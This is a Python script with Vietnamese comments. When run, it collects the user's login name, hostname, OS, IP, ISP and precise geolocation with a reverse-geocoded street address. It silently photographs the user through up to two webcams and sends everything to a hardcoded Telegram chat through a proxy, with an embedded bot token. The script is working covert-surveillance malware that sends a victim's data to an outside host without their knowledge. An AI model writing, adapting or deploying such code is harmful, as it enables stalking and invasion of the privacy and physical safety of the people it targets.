import cv2
import requests
import json
from datetime import datetime
import platform
import socket
import uuid
import os
import logging
from PIL import Image
import io
import time
import geocoder

# Cấu hình Telegram Bot  
TELEGRAM_BOT_TOKEN = '7459242458:AAEwqFEqhtP3vYxihIuCKNvWXDYiEvqdFgc'
TELEGRAM_CHAT_ID = '5868267280'
API_SEND_MEDIA = f'https://winter-hall-f9b4.jayky2k9.workers.dev/bot{TELEGRAM_BOT_TOKEN}/sendMediaGroup'
API_SEND_TEXT = f'https://winter-hall-f9b4.jayky2k9.workers.dev/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
class DeviceInfo:
    def __init__(self):
        self.info = {
            'time': datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': 'Không rõ',
            'isp': 'Không rõ',
            'real_ip': 'Không rõ', 
            'address': 'Không rõ',
            'country': 'Không rõ',
            'lat': '0',
            'lon': '0',
            'device': self.get_device_info(),
            'os': platform.system(),
            'camera': '⏳ Đang kiểm tra...',
            'user': os.getlogin()
        }

    def get_device_info(self):
        try:
            return platform.node() or socket.gethostname()
        except:
            return "Không xác định"

    def get_location_details(self):
        def get_ip_location():
            # Fallback location from IP
            try:
                response = requests.get('https://ipwho.is/')
                data = response.json()
                self.info['lat'] = str(data.get('latitude', '0'))
                self.info['lon'] = str(data.get('longitude', '0'))
                self.info['ip'] = data.get('ip', 'Không rõ')
                self.info['isp'] = data.get('connection', {}).get('org', 'Không rõ')
                self.info['country'] = data.get('country', 'Không rõ')
                self.info['address'] = f"{data.get('city', '')}, {data.get('region', '')}, {data.get('country', '')}".strip(', ')
                return True
            except:
                return False
        def get_detailed_address(lat, lon):
            try:
                # Sử dụng Nominatim để lấy địa chỉ chi tiết
                url = f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}"
                headers = {'User-Agent': 'Mozilla/5.0'}
                response = requests.get(url, headers=headers)
                data = response.json()
                
                if 'display_name' in data:
                    self.info['address'] = data['display_name']
                    if 'address' in data:
                        addr = data['address']
                        # Tạo địa chỉ chi tiết
                        address_parts = []
                        if 'house_number' in addr:
                            address_parts.append(addr['house_number'])
                        if 'road' in addr:
                            address_parts.append(addr['road'])
                        if 'suburb' in addr:
                            address_parts.append(addr['suburb'])
                        if 'city' in addr:
                            address_parts.append(addr['city'])
                        if 'state' in addr:
                            address_parts.append(addr['state'])
                        if 'country' in addr:
                            self.info['country'] = addr['country']
                            address_parts.append(addr['country'])
                        
                        if address_parts:
                            self.info['address'] = ', '.join(address_parts)
                return True
            except:
                return False
    
        # Try multiple location services
        services = [
            'https://ipapi.co/json/',
            'https://ipwhois.app/json/',
            'https://ipinfo.io/json',
            'https://ipwho.is/'
        ]
    
        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    
                    # Get coordinates
                    lat = data.get('latitude', data.get('lat', 0))
                    lon = data.get('longitude', data.get('lon', 0))
                    
                    if lat and lon:
                        self.info['lat'] = str(lat)
                        self.info['lon'] = str(lon)
                        
                        # Try to get detailed address
                        if get_detailed_address(lat, lon):
                            # If we got detailed address, break the loop
                            self.info['ip'] = data.get('ip', 'Không rõ')
                            self.info['isp'] = data.get('org', data.get('organization', 'Không rõ'))
                            break
                    
            except Exception as e:
                continue
        
        # If all services failed, try IP location as fallback
        if self.info['address'] == 'Không rõ':
            get_ip_location()
    
        # Get real IP
        try:
            response = requests.get('https://api.ipify.org?format=json')
            self.info['real_ip'] = response.json().get('ip', 'Không rõ')
        except:
            pass

    def ensure_camera_capture(self, camera_id=0, retries=3):
        """Đảm bảo chụp được ảnh từ camera với số lần thử lại"""
        for attempt in range(retries):
            try:
                cap = cv2.VideoCapture(camera_id)
                if not cap.isOpened():
                    continue
                
                # Đợi camera khởi động
                time.sleep(2)
                
                # Đọc vài frame đầu để camera ổn định
                for _ in range(5):
                    cap.read()
                
                # Chụp ảnh
                ret, frame = cap.read()
                cap.release()
                
                if ret:
                    # Chuyển đổi sang jpg với chất lượng cao
                    success, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
                    if success:
                        return io.BytesIO(buffer.tobytes())
            except Exception as e:
                logging.error(f"Camera capture attempt {attempt + 1} failed: {e}")
                time.sleep(1)
            finally:
                try:
                    cap.release()
                except:
                    pass
        return None

    def get_caption(self):
        maps_link = f"https://www.google.com/maps?q={self.info['lat']},{self.info['lon']}"
        
        return f"""
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian (UTC): {self.info['time']}
👤 User: {self.info['user']}
📱 Thiết bị: {self.info['device']}
🖥️ Hệ điều hành: {self.info['os']}
🌍 IP: {self.info['ip']}
🏢 ISP: {self.info['isp']}
🏙️ Địa chỉ: {self.info['address']}
🌎 Quốc gia: {self.info['country']}
📍 Vĩ độ: {self.info['lat']}
📍 Kinh độ: {self.info['lon']}
📌 Google Maps: {maps_link}
📸 Camera: {self.info['camera']}
""".strip()

    def send_photos(self, photos):
        try:
            files = {}
            media = []
            
            for i, photo in enumerate(photos):
                if photo:
                    key = f'photo{i}'
                    files[key] = (f'{key}.jpg', photo.getvalue(), 'image/jpeg')
                    media_item = {
                        'type': 'photo',
                        'media': f'attach://{key}'
                    }
                    if i == 0:  # Chỉ thêm caption cho ảnh đầu tiên
                        media_item['caption'] = self.get_caption()
                    media.append(media_item)
            
            if media:
                data = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'media': json.dumps(media)
                }
                
                response = requests.post(API_SEND_MEDIA, data=data, files=files)
                return response.ok
            return False
            
        except Exception as e:
            logging.error(f"Error sending photos: {e}")
            return False

    def send_text_only(self):
        try:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': self.get_caption()
            }
            response = requests.post(API_SEND_TEXT, json=data)
            return response.ok
        except Exception as e:
            logging.error(f"Error sending text: {e}")
            return False

    def main(self):
        # Thu thập thông tin vị trí
        self.get_location_details()
        
        # Chụp ảnh từ tất cả camera có thể
        photos = []
        cameras_attempted = 0
        cameras_captured = 0
        
        # Thử với cả camera trước và sau
        for camera_id in range(2):
            cameras_attempted += 1
            photo = self.ensure_camera_capture(camera_id)
            if photo:
                cameras_captured += 1
                photos.append(photo)
        
        # Cập nhật trạng thái camera
        if cameras_captured > 0:
            self.info['camera'] = f'✅ Đã chụp được {cameras_captured}/{cameras_attempted} camera'
            self.send_photos(photos)
        else:
            self.info['camera'] = '🚫 Không thể truy cập camera'
            self.send_text_only()

if __name__ == "__main__":
    device_info = DeviceInfo()
    device_info.main()